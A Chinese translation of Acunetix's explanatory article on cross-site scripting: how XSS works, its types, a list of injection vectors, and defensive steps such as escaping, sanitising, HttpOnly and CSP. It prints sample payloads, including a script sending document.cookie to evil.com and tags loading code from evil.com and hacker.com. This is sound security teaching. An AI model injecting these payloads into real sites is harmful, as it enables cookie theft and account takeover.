
---
title: '_译_ 跨站脚本攻击（XSS）'
categories: 
 - 编程
 - 掘金
 - 分类
headimg: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d3970aa2ab754fb58fb760d0bece516c~tplv-k3u1fbpfcp-zoom-1.image'
author: 掘金
comments: false
date: Wed, 05 May 2021 23:49:30 GMT
thumbnail: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d3970aa2ab754fb58fb760d0bece516c~tplv-k3u1fbpfcp-zoom-1.image'
---

<div>   
<div class="markdown-body"><style>.markdown-body&#123;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333&#125;.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6&#123;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px&#125;.markdown-body h1&#123;font-size:30px;margin-bottom:5px&#125;.markdown-body h2&#123;padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec&#125;.markdown-body h3&#123;font-size:18px;padding-bottom:0&#125;.markdown-body h4&#123;font-size:16px&#125;.markdown-body h5&#123;font-size:15px&#125;.markdown-body h6&#123;margin-top:5px&#125;.markdown-body p&#123;line-height:inherit;margin-top:22px;margin-bottom:22px&#125;.markdown-body img&#123;max-width:100%&#125;.markdown-body hr&#123;border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px&#125;.markdown-body code&#123;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em&#125;.markdown-body code,.markdown-body pre&#123;font-family:Menlo,Monaco,Consolas,Courier New,monospace&#125;.markdown-body pre&#123;overflow:auto;position:relative;line-height:1.75&#125;.markdown-body pre>code&#123;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8&#125;.markdown-body a&#123;text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff&#125;.markdown-body a:active,.markdown-body a:hover&#123;color:#275b8c&#125;.markdown-body table&#123;display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6&#125;.markdown-body thead&#123;background:#f6f6f6;color:#000;text-align:left&#125;.markdown-body tr:nth-child(2n)&#123;background-color:#fcfcfc&#125;.markdown-body td,.markdown-body th&#123;padding:12px 7px;line-height:24px&#125;.markdown-body td&#123;min-width:120px&#125;.markdown-body blockquote&#123;color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8&#125;.markdown-body blockquote:after&#123;display:block;content:""&#125;.markdown-body blockquote>p&#123;margin:10px 0&#125;.markdown-body ol,.markdown-body ul&#123;padding-left:28px&#125;.markdown-body ol li,.markdown-body ul li&#123;margin-bottom:0;list-style:inherit&#125;.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item&#123;list-style:none&#125;.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul&#123;margin-top:0&#125;.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul&#123;margin-top:3px&#125;.markdown-body ol li&#123;padding-left:6px&#125;.markdown-body .contains-task-list&#123;padding-left:0&#125;.markdown-body .task-list-item&#123;list-style:none&#125;@media (max-width:720px)&#123;.markdown-body h1&#123;font-size:24px&#125;.markdown-body h2&#123;font-size:20px&#125;.markdown-body h3&#123;font-size:18px&#125;&#125;</style><blockquote>
<ul>
<li>原文地址：<a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank" rel="nofollow noopener noreferrer">Cross-site Scripting (XSS)</a></li>
<li>原文作者：<a href="https://www.acunetix.com/" target="_blank" rel="nofollow noopener noreferrer">Acunetix</a></li>
<li>译文出自：<a href="https://github.com/xitu/gold-miner" target="_blank" rel="nofollow noopener noreferrer">掘金翻译计划</a></li>
<li>本文永久链接：<a href="https://github.com/xitu/gold-miner/blob/master/article/2021/cross-site-scripting.md" target="_blank" rel="nofollow noopener noreferrer">github.com/xitu/gold-m…</a></li>
<li>译者：<a href="https://github.com/MoonBall" target="_blank" rel="nofollow noopener noreferrer">MoonBall</a></li>
<li>校对者：<a href="https://github.com/Chorer" target="_blank" rel="nofollow noopener noreferrer">Chorer</a>、<a href="https://github.com/kamly" target="_blank" rel="nofollow noopener noreferrer">kamly</a>、<a href="https://github.com/lsvih" target="_blank" rel="nofollow noopener noreferrer">lsvih</a></li>
</ul>
</blockquote>
<p>跨站脚本攻击（XSS）是一种客户端代码<a href="https://www.acunetix.com/blog/articles/injection-attacks/" target="_blank" rel="nofollow noopener noreferrer">注入攻击</a>。攻击者通过在合法的网页中注入恶意代码，达到在受害者的浏览器中执行恶意代码的目的。当受害者访问执行恶意代码的网页时，攻击就开始了。这些网页成为了将恶意代码发送到用户浏览器的工具。通常受到跨站脚本攻击的网页包括论坛、留言板以及可以评论的网页。</p>
<p>如果网页将用户的原始输入作为网页内容，那么它很容易受到 XSS 攻击，因为这类用户输入一定会被受害者的浏览器解析。XSS 攻击可能存在于 VBScript、ActiveX、Flash，甚至 CSS 中。但它在 JavaScript 中最常见，主要是因为 JavaScript 是大多数浏览体验的基础。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d3970aa2ab754fb58fb760d0bece516c~tplv-k3u1fbpfcp-zoom-1.image" alt="XSS" loading="lazy" referrerpolicy="no-referrer"></p>
<h2 data-id="heading-0">“跨站脚本攻击只影响用户吗？”</h2>
<p>如果攻击者能利用某网页上的 XSS 漏洞，在用户浏览器上执行任意的 JavaScript 代码，那么该网站和它的用户都会被影响。像其他安全性问题一样，XSS 不只会给用户造成困扰。如果它影响了你的用户，那么它也会影响你。</p>
<p>跨站脚本攻击也可能用于<a href="https://www.acunetix.com/blog/news/full-disclosure-high-profile-websites-xss/" target="_blank" rel="nofollow noopener noreferrer">丑化原网站</a>，而不是攻击网站用户。攻击者通过注入脚本，改变网站的内容，或者甚至将当前页面重定向到另一个网页，例如一个有恶意代码的网页。</p>
<h2 data-id="heading-1">攻击者能利用 JavaScript 做什么？</h2>
<p>与诸如 <a href="https://www.acunetix.com/websitesecurity/sql-injection/" target="_blank" rel="nofollow noopener noreferrer">SQL 注入</a>这样的漏洞相比，我们一般会认为 XSS 漏洞是低风险的。起初，能在网页端执行 JavaScript 引起的后果可能并不严重。大多数浏览器都是在严格受控的环境中运行 JavaScript，这使得 JavaScript 在访问用户的操作系统和文件上受到限制。但是，如果将 JavaScript 用于恶意内容中，它仍然会带来一定的风险：</p>
<ul>
<li>网页其余部分能访问的所有对象，恶意的 JavaScript 都能访问。包括访问用户的 cookie。用户的 cookie 通常被用来存储会话标志。如果攻击者获得了用户的会话 cookie，他们便能伪装成该用户，利用其身份执行操作，并且访问用户的敏感数据。</li>
<li>JavaScript 可以读取并任意修改浏览器中的 DOM。还好，该情形只可能发生在 JavaScript 当前运行的网页中。</li>
<li>JavaScript 可使用 <code>XMLHttpRequest</code> 对象，向任意站点发送带有任意数据的 HTTP 请求。</li>
<li>现代浏览器中的 JavaScript 可使用 HTML5 接口。例如可访问用户的地理位置、摄像头、麦克风，甚至是用户文件系统中的指定文件。虽然这些接口大多数都需要经过用户同意，但攻击者可通过社会工程学绕过这些限制。</li>
</ul>
<p>通过以上几点，并结合社会工程学，不法之徒可发起更高级的攻击，包括：盗窃 Cookie、种植木马、记录密钥、网络钓鱼和盗窃身份。XSS 漏洞提供了完美的空间将攻击升级为更严重的攻击。跨站脚本攻击经常与其他类型的攻击一起被使用，例如：<a href="https://www.acunetix.com/websitesecurity/csrf-attacks/" target="_blank" rel="nofollow noopener noreferrer">跨站请求伪造（CSRF）</a>。</p>
<p>跨站脚本攻击的类型包括：<a href="https://www.acunetix.com/blog/articles/persistent-xss/" target="_blank" rel="nofollow noopener noreferrer">存储型/持久化的 XSS</a>、 <a href="https://www.acunetix.com/blog/articles/non-persistent-xss/" target="_blank" rel="nofollow noopener noreferrer">反射型/非持久化的 XSS</a> 和 <a href="https://www.acunetix.com/blog/articles/dom-xss-explained/" target="_blank" rel="nofollow noopener noreferrer">基于 DOM 的 XSS</a>。你可在 <a href="https://www.acunetix.com/websitesecurity/xss/" target="_blank" rel="nofollow noopener noreferrer">XSS 的类型</a>一文中了解更多内容。</p>
<h2 data-id="heading-2">跨站脚本攻击如何工作</h2>
<p>典型的 XSS 攻击有两个阶段：</p>
<ol>
<li>为了在受害者的浏览器中运行恶意 JavaScript 代码，攻击者必须先找到一种方式将恶意代码注入到受害者访问的网页中。</li>
<li>之后，受害者必须访问有恶意代码的网页。如果攻击者有特定的攻击目标，该攻击者可使用社会工程学结合（或）网络钓鱼的方式给受害者发送恶意网址。</li>
</ol>
<p>要完成第一步，易受攻击的网站需要将用户的输入直接包含在它的页面中。之后攻击者便能插入恶意代码片段，这些代码将在网页中使用并被受害者的浏览器视为源代码。也有一些 XSS 攻击的变体，攻击者利用社会工程学诱导用户访问某网址，并且该网址中就包含了恶意代码。</p>
<p>以下是服务端伪代码片段，用于在网页中展示最近的评论：</p>
<pre><code class="hljs language-python copyable" lang="python"><span class="hljs-built_in">print</span> <span class="hljs-string">"<html>"</span>
<span class="hljs-built_in">print</span> <span class="hljs-string">"<h1>Most recent comment</h1>"</span>
<span class="hljs-built_in">print</span> database.latestComment
<span class="hljs-built_in">print</span> <span class="hljs-string">"</html>"</span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>以上脚本很简单，作用是从数据库中取出最近的评论并放入 HTML 页面中。这段脚本默认页面展示的评论是纯文本，而不包含 HTML 标签或其他代码。这就导致了页面很容易遭受 XSS 攻击，因为攻击者可以提交包含恶意代码的评论。例如当评论的内容是以下代码：</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-tag"><<span class="hljs-name">script</span>></span>
  doSomethingEvil();
<span class="hljs-tag"></<span class="hljs-name">script</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>网站服务端为访问该网页的用户提供以下 HTML 代码：</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-tag"><<span class="hljs-name">html</span>></span>
  <span class="hljs-tag"><<span class="hljs-name">h1</span>></span>Most recent comment<span class="hljs-tag"></<span class="hljs-name">h1</span>></span>
  <span class="hljs-tag"><<span class="hljs-name">script</span>></span>
    doSomethingEvil();
  <span class="hljs-tag"></<span class="hljs-name">script</span>></span>
<span class="hljs-tag"></<span class="hljs-name">html</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>当受害者的浏览器加载该页面时，攻击者的恶意脚本开始执行。受害者常常不会意识到这类情形，也不能阻止这类攻击。</p>
<h2 data-id="heading-3">使用 XSS 攻击偷取 Cookie</h2>
<p>不法之徒经常使用 XSS 攻击偷取 cookie。如此他们便能伪装成受害者。攻击者有多种方式将 cookie 发送到他们自己的服务器。其中一种方式是在受害者浏览器中执行以下客户端代码：</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-tag"><<span class="hljs-name">script</span>></span><span class="javascript">
  <span class="hljs-built_in">window</span>.location = <span class="hljs-string">"http://evil.com/?cookie="</span> + <span class="hljs-built_in">document</span>.cookie;
</span><span class="hljs-tag"></<span class="hljs-name">script</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下图展示了简单 XSS 攻击的各步骤。</p>
<p><img src="https://www.acunetix.com/wp-content/uploads/2012/10/how-xss-works-910x404.png" alt="Cross site scripting" loading="lazy" referrerpolicy="no-referrer"></p>
<ol>
<li>攻击者通过在提交表单时携带恶意 JavaScript 内容，将恶意内容注入到网站的数据库中。</li>
<li>受害者向网站服务端请求网页。</li>
<li>网站服务端将攻击者的恶意内容作为 HTML 内容的一部分，并返回给受害者的浏览器。</li>
<li>受害者的浏览器执行包含在 HTML 中的恶意脚本。在该场景中，它将受害者的 cookie 发送到攻击者的服务器。</li>
<li>在 HTTP 请求抵达服务器时，攻击者只需从请求中提取受害者的 cookie 即可。</li>
<li>攻击者可以使用刚刚偷窃的受害者 cookie 进行伪装。</li>
</ol>
<p>想了解更多如何实现 XSS 攻击，你可以参考<a href="https://excess-xss.com/" target="_blank" rel="nofollow noopener noreferrer">一份跨站脚本攻击的综合教程</a>。</p>
<h2 data-id="heading-4">跨站脚本攻击方式</h2>
<p>以下列表包含常见的 XSS 攻击方式，攻击者可使用它们降低网站的安全性。OWASP 组织维护了一个更完整的 XSS 攻击方式的列表：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="nofollow noopener noreferrer">XSS Filter Evasion Cheat Sheet</a>。</p>
<h3 data-id="heading-5"><code><script></code> 标签</h3>
<p><code><script></code> 标签是最直接的 XSS 攻击方式。它可以引用外部 JavaScript 代码或者将代码嵌入到标签内。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- 引用外部 JavaScript 代码--></span>
<span class="hljs-tag"><<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://evil.com/xss.js</span>></span><span class="hljs-tag"></<span class="hljs-name">script</span>></span>
<span class="hljs-comment"><!-- 将代码嵌入到标签内 --></span>
<span class="hljs-tag"><<span class="hljs-name">script</span>></span><span class="javascript"> alert(<span class="hljs-string">"XSS"</span>); </span><span class="hljs-tag"></<span class="hljs-name">script</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-6">JavaScript 事件</h3>
<p>像 <code>onload</code> 和 <code>onerror</code> 这类 JavaScript 事件属性能在很多种标签中使用。这也是一类非常流行的 XSS 攻击方式。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <body> 标签上的 onload 属性 --></span>
<span class="hljs-tag"><<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>"<span class="hljs-attr">XSS</span>")></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-7"><code><body></code> 标签</h3>
<p>在 <code><body></code> 标签中，除了像上面一样，可以通过事件属性实现 XSS 攻击代码外，还可以通过更多鲜为人知的属性，比如：<code>background</code> 属性。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- background 属性 --></span>
<span class="hljs-tag"><<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"javascript:alert("</span><span class="hljs-attr">XSS</span>")"></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-8"><code><img></code> 标签</h3>
<p>一部分浏览器会执行 <code><img></code> 属性中的 JavaScript 代码。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <img> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert("</span><span class="hljs-attr">XSS</span>");"></span>
<span class="hljs-comment"><!--  通过鲜为人知的属性进行 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">img</span> <span class="hljs-attr">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span> /></span>
<span class="hljs-tag"><<span class="hljs-name">img</span> <span class="hljs-attr">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span> /></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-9"><code><iframe></code> 标签</h3>
<p><code><iframe></code> 标签的功能是将另一个 HTML 页面嵌入到当前页面中。由于内容安全协议（CSP），尽管 IFrame 中可能有 JavaScript 代码，但这些代码没有权限访问父页面上的 DOM。然而，IFrame 仍然是发起网络钓鱼攻击的有效方式。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <iframe> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://evil.com/xss.html"</span>></span><span class="hljs-tag"></<span class="hljs-name">iframe</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-10"><code><input></code> 标签</h3>
<p>在一些浏览器中，如果 <code><input></code> 标签的 <code>type</code> 属性被设置成 <code>image</code>，那么它便能嵌入脚本。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <input> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert('XSS');"</span> /></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-11"><code><link></code> 标签</h3>
<p><code><link></code> 标签通常用于链接外部样式表，但也可以包含脚本。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <link> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert('XSS');"</span> /></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-12"><code><table></code> 标签</h3>
<p><code><table></code> 和 <code><td></code> 标签的 <code>background</code> 属性可用于引用脚本而不是引用图片。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <table> 标签 XSS --></span>
<span class="hljs-tag"><<span class="hljs-name">table</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>></span>
  <span class="hljs-comment"><!-- <td> 标签 XSS --></span>
  <span class="hljs-tag"><<span class="hljs-name">td</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>></span><span class="hljs-tag"></<span class="hljs-name">td</span>></span>
<span class="hljs-tag"></<span class="hljs-name">table</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-13"><code><div></code> 标签</h3>
<p>与 <code><table></code> 和 <code><td></code> 标签类似，<code><div></code> 标签也可以通过 <code>background</code> 属性嵌入脚本。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <div> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background-image: url(javascript:alert('XSS'))"</span>></span>
  <span class="hljs-comment"><!-- <div> 标签 XSS 攻击 --></span>
  <span class="hljs-tag"><<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: expression(alert('XSS'));"</span>></span><span class="hljs-tag"></<span class="hljs-name">div</span>></span>
<span class="hljs-tag"></<span class="hljs-name">div</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h3 data-id="heading-14"><code><object></code> 标签</h3>
<p><code><object></code> 标签能用于引入外部网站的脚本。</p>
<pre><code class="hljs language-html copyable" lang="html"><span class="hljs-comment"><!-- <object> 标签 XSS 攻击 --></span>
<span class="hljs-tag"><<span class="hljs-name">object</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/x-scriptlet"</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"http://hacker.com/xss.html"</span>></span><span class="hljs-tag"></<span class="hljs-name">object</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<h2 data-id="heading-15">你的网站是否易受跨站脚本攻击？</h2>
<p>跨站脚本攻击漏洞是最常见的网站漏洞之一。OWASP 组织（开放网络应用安全工程）在 <a href="https://www.acunetix.com/blog/articles/owasp-top-10-2017/" target="_blank" rel="nofollow noopener noreferrer">OWASP Top 10 2017</a> 一文中将 XSS 漏洞列为第二流行问题。</p>
<p>幸运的是，通过运行 Acunetix 的<a href="https://www.acunetix.com/vulnerability-scanner/" target="_blank" rel="nofollow noopener noreferrer">漏洞扫描器</a>对网站进行自动扫描，将很容易测试你的网站是否存在 XSS 漏洞或其他漏洞。Acunetix 的<a href="https://www.acunetix.com/vulnerability-scanner/" target="_blank" rel="nofollow noopener noreferrer">漏洞扫描器</a> 包含专门的 XSS 漏洞扫描模块。你可以在<a href="https://www.acunetix.com/web-vulnerability-scanner/demo/" target="_blank" rel="nofollow noopener noreferrer">这个例子中</a>找到更多有关对网站运行 XSS 漏洞扫描的信息。<a href="https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/" target="_blank" rel="nofollow noopener noreferrer">如何检测盲目 XSS 攻击漏洞</a>一文中介绍了如何使用 Acunetix 检测盲目 XSS 攻击漏洞的例子。</p>
<h2 data-id="heading-16">如何避免 XSS 攻击</h2>
<p>为了免受 XSS 攻击，你必须对用户的输入进行校验。你的应用代码不应该在没有检查接收的数据是否是恶意代码的情况下，直接将收到的数据输出给浏览器。</p>
<p>参考这些文章获取更多细节：<a href="https://www.acunetix.com/blog/articles/preventing-xss-attacks/" target="_blank" rel="nofollow noopener noreferrer">预防 XSS 攻击</a>和<a href="https://www.acunetix.com/blog/web-security-zone/how-to-prevent-dom-based-cross-site-scripting/" target="_blank" rel="nofollow noopener noreferrer">预防基于 DOM 的跨站脚本攻击</a>。你也可以在 OWASP 维护的<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="nofollow noopener noreferrer">预防 XSS 攻击的速查表</a>中找到有用的信息。</p>
<h2 data-id="heading-17">如何预防跨站脚本攻击（XSS）—— 通用技巧</h2>
<p>预防跨站脚本攻击（XSS）并不容易。特定的预防技术和 XSS 漏洞的类型、用户输入时的场景上下文和编程框架相关。尽管如此，你仍然可以遵循一些通用策略来确保网站安全。</p>
<h3 data-id="heading-18">第一步：培训并保持安全意识</h3>
<p>为了保证你的网站安全，所有参与搭建该网站的人员都必须意识到 XSS 漏洞相关的风险。你应该为所有开发者、测试员工、运维员工和系统管理员提供适量的安全培训。你可以让他们参考这篇文章作为安全培训的开始。</p>
<h3 data-id="heading-19">第二步：不要信任任何用户输入</h3>
<p>将所有用户输入都看作不可信的。任何被用作 HTML 输出结果的用户输入都有 XSS 攻击的风险。对待授权用户或内部员工的输入，也应该像对待外部用户输入一样，将其视为不可信。</p>
<h3 data-id="heading-20">第三步：使用转义或编码</h3>
<p>根据用户输入内容的使用场景，使用合适的转义或编码技术，比如：HTML 转义、JavaScript 转义、CSS 转义、URL 转义等等。不到万不得已，不要自己写转义库，尽量使用已经存在的转义库。</p>
<h3 data-id="heading-21">第四步：清理 HTML</h3>
<p>如果用户输入包含 HTML 内容，那么不能对这些内容进行转义，否则将导致标签不合法（译者注：例如期望 <code><div></code>，但转义后结果为 <code>&lt;div&gt;</code>）。在这种情况下，使用信任的并且验证过的库对 HTML 进行分析和清理。选择哪个库需根据你的开发语言而定，例如：在 .NET 上使用 HtmlSanitizer，在 Ruby on Rails 上使用 SanitizeHelper。</p>
<h3 data-id="heading-22">第五步：设置 HttpOnly 标志</h3>
<p>为了减轻可能存在的 XSS 漏洞造成的后果，可开启 cookie 的 HttpOnly 标志。这样客户端 JavaScript 将不能访问这些 cookie。</p>
<h3 data-id="heading-23">第六步：使用内容安全协议</h3>
<p>为了减轻可能存在的 XSS 漏洞造成的后果，也可以使用内容安全协议（CSP）。CSP 是一个 HTTP 响应头，它可以根据当前请求的资源声明哪些动态资源是允许被加载的。</p>
<h3 data-id="heading-24">第七步：周期性扫描</h3>
<p>XSS 漏洞可能被开发者引入，也可能被外部库、模块或软件引入。你应该使用网站漏洞扫描器（比如 Acunetix）周期性扫描你的网站。如果你使用 Jenkins，你可以安装 Acunetix 插件，实现每次构建时进行自动扫描。</p>
<h2 data-id="heading-25">FAQ</h2>
<p><strong>跨站脚本攻击是如何工作的？</strong></p>
<p>在跨站脚本攻击（XSS）中，攻击者通过有漏洞的网页将恶意 JavaScript 代码发送给用户。用户的浏览器在用户的电脑上执行恶意 JavaScript 代码。值得注意的是，大约三分之一的网站都存在跨站脚本攻击漏洞。</p>
<p><strong>为什么跨站脚本攻击是危险的？</strong></p>
<p>尽管跨站脚本攻击发生在用户的浏览器，它仍然有可能对你的网站造成影响。例如，攻击者可以使用 XSS 窃取用户凭证并伪装成该用户登录你的网站。如果被窃取的用户是网站管理员，则攻击者将对你的网站有更多控制权。</p>
<p><a href="https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/" target="_blank" rel="nofollow noopener noreferrer">查看过去发生的一例高风险的 XSS 攻击例子</a>。</p>
<p><strong>如何发现跨站脚本攻击漏洞</strong></p>
<p>为了发现跨站脚本漏洞，你可以进行人工渗透测试或者先使用漏洞扫描器。如果你使用了漏洞扫描器，那么你将节约许多时间和钱，因为你的渗透测试人员可以聚焦到更有挑战的漏洞中。</p>
<p><a href="https://www.acunetix.com/blog/web-security-zone/penetration-testing-vs-vulnerability-scanning/" target="_blank" rel="nofollow noopener noreferrer">查看为什么在雇佣测试人员之前，使用漏洞扫描器是个不错的选择</a>。</p>
<p><strong>如何防御跨站脚本攻击</strong></p>
<p>为了防御跨站脚本攻击，你必须周期性扫描你的网站，或者至少在每次修改了代码后都扫描一次。之后，开发者必须进行正确的编码才能消除漏洞。与流行的观点相悖，网站防火墙不能防御跨站脚本攻击，他们仅仅使攻击变得更困难 —— 但漏洞仍然存在。</p>
<blockquote>
<p>如果发现译文存在错误或其他需要改进的地方，欢迎到 <a href="https://github.com/xitu/gold-miner" target="_blank" rel="nofollow noopener noreferrer">掘金翻译计划</a> 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 <strong>本文永久链接</strong> 即为本文在 GitHub 上的 MarkDown 链接。</p>
</blockquote>
<hr>
<blockquote>
<p><a href="https://github.com/xitu/gold-miner" target="_blank" rel="nofollow noopener noreferrer">掘金翻译计划</a> 是一个翻译优质互联网技术文章的社区，文章来源为 <a href="https://juejin.im/" target="_blank" rel="nofollow noopener noreferrer">掘金</a> 上的英文分享文章。内容覆盖 <a href="https://github.com/xitu/gold-miner#android" target="_blank" rel="nofollow noopener noreferrer">Android</a>、<a href="https://github.com/xitu/gold-miner#ios" target="_blank" rel="nofollow noopener noreferrer">iOS</a>、<a href="https://github.com/xitu/gold-miner#%E5%89%8D%E7%AB%AF" target="_blank" rel="nofollow noopener noreferrer">前端</a>、<a href="https://github.com/xitu/gold-miner#%E5%90%8E%E7%AB%AF" target="_blank" rel="nofollow noopener noreferrer">后端</a>、<a href="https://github.com/xitu/gold-miner#%E5%8C%BA%E5%9D%97%E9%93%BE" target="_blank" rel="nofollow noopener noreferrer">区块链</a>、<a href="https://github.com/xitu/gold-miner#%E4%BA%A7%E5%93%81" target="_blank" rel="nofollow noopener noreferrer">产品</a>、<a href="https://github.com/xitu/gold-miner#%E8%AE%BE%E8%AE%A1" target="_blank" rel="nofollow noopener noreferrer">设计</a>、<a href="https://github.com/xitu/gold-miner#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD" target="_blank" rel="nofollow noopener noreferrer">人工智能</a>等领域，想要查看更多优质译文请持续关注 <a href="https://github.com/xitu/gold-miner" target="_blank" rel="nofollow noopener noreferrer">掘金翻译计划</a>、<a href="http://weibo.com/juejinfanyi" target="_blank" rel="nofollow noopener noreferrer">官方微博</a>、<a href="https://zhuanlan.zhihu.com/juejinfanyi" target="_blank" rel="nofollow noopener noreferrer">知乎专栏</a>。</p>
</blockquote></div>  
</div>
            